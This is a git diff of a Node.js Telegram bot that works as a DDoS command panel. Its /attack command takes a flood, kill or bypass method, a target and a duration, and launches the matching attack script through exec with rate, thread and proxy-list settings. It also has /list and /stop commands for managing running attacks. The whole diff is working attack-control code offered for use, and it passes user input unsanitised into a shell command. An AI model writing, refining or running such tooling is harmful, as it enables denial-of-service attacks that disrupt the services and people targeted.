@@ -17,150 +17,108 @@ app.get('/', (req, res) => {
 
 app.listen(port);
 
-bot.onText(/^\/system$/, async (msg) => {
-  if (msg.from.id.toString() !== adminId) {
-    bot.sendMessage(msg.chat.id, 'Access denied');
-    return;
-  }
-  try {
-    const data = await si.getAllData();
-    bot.sendMessage(msg.chat.id, JSON.stringify(data, null, 2));
-  } catch (e) {
-    bot.sendMessage(msg.chat.id, 'Error fetching system info');
-  }
-});
-
-bot.onText(/^\/attack (.+)/, async (msg, match) => {
-  if (msg.from.id.toString() !== adminId) {
-    bot.sendMessage(msg.chat.id, 'Access denied');
-    return;
-  }
-
-  const args = match[1].trim().split(/\s+/);
-  let method = 'flood';
-  let target = '';
-  let time = 0;
-  let core = 1;
-
-  const coreIndex = args.findIndex(arg => arg === '--core');
-  if (coreIndex !== -1 && args[coreIndex + 1]) {
-    core = parseInt(args[coreIndex + 1]);
-    args.splice(coreIndex, 2);
-  }
-
-  if (['flood', 'kill', 'bypass'].includes(args[0])) {
-    method = args[0];
-    target = args[1];
-    time = parseInt(args[2]);
-  } else {
-    target = args[0];
-    time = parseInt(args[1]);
-  }
-
-  if (!target || isNaN(time)) {
-    bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time] --core [number]');
-    return;
-  }
-
-  const rate = 25;
-  const threads = 10;
-  const proxyfile = './prx.txt';
-  const attackId = Date.now();
-  const pids = [];
-
-  const message = await bot.sendMessage(msg.chat.id, JSON.stringify({
-    status: 'started',
-    target,
-    time,
-    rate,
-    threads,
-    proxyfile,
-    core
-  }, null, 2));
-
-  for (let i = 0; i < core; i++) {
-    const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`, (err) => {
-      if (err) {
-        bot.sendMessage(msg.chat.id, `Core ${i + 1} failed: ${err.message}`);
-      }
-    });
-    pids.push(child.pid);
-  }
-
-  const attackData = {
-    id: attackId,
-    target,
-    time,
-    rate,
-    threads,
-    proxyfile,
-    status: 'running',
-    messageId: message.message_id,
-    pids,
-    core
-  };
-
-  attacks.push(attackData);
-
-  let remainingTime = time;
-  const interval = setInterval(() => {
-    remainingTime -= 5;
-    if (remainingTime <= 0) {
-      clearInterval(interval);
-      bot.deleteMessage(msg.chat.id, attackData.messageId);
-      attacks = attacks.filter(a => a.id !== attackId);
+bot.on('message', async (msg) => {
+  if (msg.text === '/system') {
+    if (msg.from.id.toString() !== adminId) {
+      bot.sendMessage(msg.chat.id, 'Access denied');
       return;
     }
-    bot.editMessageText(JSON.stringify({
-      status: attackData.status,
+    try {
+      const data = await si.getAllData();
+      bot.sendMessage(msg.chat.id, JSON.stringify(data, null, 2));
+    } catch (e) {
+      bot.sendMessage(msg.chat.id, 'Error fetching system info');
+    }
+  }
+
+  if (msg.text.startsWith('/attack')) {
+    if (msg.from.id.toString() !== adminId) {
+      bot.sendMessage(msg.chat.id, 'Access denied');
+      return;
+    }
+    const args = msg.text.split(' ').slice(1);
+    let method = 'flood';
+    let target = '';
+    let time = 0;
+
+    if (['flood', 'kill', 'bypass'].includes(args[0])) {
+      method = args[0];
+      target = args[1];
+      time = parseInt(args[2]);
+    } else {
+      target = args[0];
+      time = parseInt(args[1]);
+    }
+
+    if (!target || isNaN(time)) {
+      bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]');
+      return;
+    }
+
+    const rate = 25;
+    const threads = 10;
+    const proxyfile = './prx.txt';
+    const attackId = Date.now();
+
+    bot.sendMessage(msg.chat.id, JSON.stringify({
+      status: 'running',
       target,
-      time: remainingTime,
+      time,
+      rate,
+      threads,
+      proxyfile
+    }, null, 2));
+
+    const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`, (err) => {
+      if (err) {
+        bot.sendMessage(msg.chat.id, `Attack failed: ${err.message}`);
+      }
+    });
+
+    attacks.push({
+      id: attackId,
+      target,
+      time,
       rate,
       threads,
       proxyfile,
-      core
-    }, null, 2), {
-      chat_id: msg.chat.id,
-      message_id: attackData.messageId
-    }).catch(() => {
-      clearInterval(interval);
-      attacks = attacks.filter(a => a.id !== attackId);
+      status: 'running',
+      pid: child.pid
     });
-  }, 5000);
 
-  bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`);
-});
+    bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`);
+  }
 
-bot.onText(/^\/list$/, (msg) => {
-  if (msg.from.id.toString() !== adminId) {
-    bot.sendMessage(msg.chat.id, 'Access denied');
-    return;
+  if (msg.text === '/list') {
+    if (msg.from.id.toString() !== adminId) {
+      bot.sendMessage(msg.chat.id, 'Access denied');
+      return;
+    }
+    if (attacks.length === 0) {
+      bot.sendMessage(msg.chat.id, 'No active attacks');
+      return;
+    }
+    const attackList = attacks.map(a => `ID: ${a.id}, Target: ${a.target}, Time: ${a.time}s`).join('\n');
+    bot.sendMessage(msg.chat.id, `Active attacks:\n${attackList}`);
   }
-  if (attacks.length === 0) {
-    bot.sendMessage(msg.chat.id, 'No active attacks');
-    return;
-  }
-  const attackList = attacks.map(a => `ID: ${a.id}, Target: ${a.target}, Time: ${a.time}s, Core: ${a.core}`).join('\n');
-  bot.sendMessage(msg.chat.id, `Active attacks:\n${attackList}`);
-});
 
-bot.onText(/^\/stop (\d+)/, (msg, match) => {
-  if (msg.from.id.toString() !== adminId) {
-    bot.sendMessage(msg.chat.id, 'Access denied');
-    return;
-  }
-  const attackId = parseInt(match[1]);
-  const attack = attacks.find(a => a.id === attackId);
-  if (!attack) {
-    bot.sendMessage(msg.chat.id, 'Attack not found');
-    return;
-  }
-  attacks = attacks.filter(a => a.id !== attackId);
-  try {
-    attack.pids.forEach(pid => process.kill(pid));
-    bot.deleteMessage(msg.chat.id, attack.messageId);
-    bot.sendMessage(msg.chat.id, `Attack ${attackId} stopped`);
-  } catch (e) {
-    bot.sendMessage(msg.chat.id, `Error stopping attack: ${e.message}`);
+  if (msg.text.startsWith('/stop')) {
+    if (msg.from.id.toString() !== adminId) {
+      bot.sendMessage(msg.chat.id, 'Access denied');
+      return;
+    }
+    const attackId = parseInt(msg.text.split(' ')[1]);
+    const attack = attacks.find(a => a.id === attackId);
+    if (!attack) {
+      bot.sendMessage(msg.chat.id, 'Attack not found');
+      return;
+    }
+    attacks = attacks.filter(a => a.id !== attackId);
+    try {
+      process.kill(attack.pid);
+      bot.sendMessage(msg.chat.id, `Attack ${attackId} stopped`);
+    } catch (e) {
+      bot.sendMessage(msg.chat.id, `Error stopping attack: ${e.message}`);
+    }
   }
 });
